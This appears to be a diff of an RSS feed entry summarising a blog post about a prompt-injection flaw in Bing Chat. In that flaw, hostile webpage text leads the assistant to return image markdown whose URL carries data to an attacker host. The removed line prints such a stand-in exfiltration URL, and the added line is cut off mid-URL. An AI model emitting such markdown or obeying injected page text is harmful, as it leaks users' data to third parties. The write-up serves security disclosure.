@@ -17,7 +17,7 @@
       <description>This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.
 The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.
 Imagine the LLM returns the following text:
-![data exfiltration in progress](https://attacker/q=[DATA_EXFILTRATION]) This will be rendered as an HTML image tag with a src attribute pointing to the attacker server.</description>
+![data exfiltration in progress](https://attacker/logo.</description>
     </item>
     
   </channel>
